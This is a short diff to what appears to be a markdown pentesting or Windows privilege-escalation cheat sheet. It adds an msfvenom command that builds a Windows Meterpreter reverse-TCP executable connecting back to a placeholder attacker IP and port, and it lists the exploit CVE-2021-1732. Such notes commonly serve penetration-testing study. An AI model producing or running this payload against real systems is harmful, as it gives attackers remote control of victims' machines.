@@ -22,6 +22,12 @@ C:\Program Files
 C:\Program Files (x86)
 ```
 
+msfvenom
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
+```
+
 Exploits
 
 - CVE-2021-1732
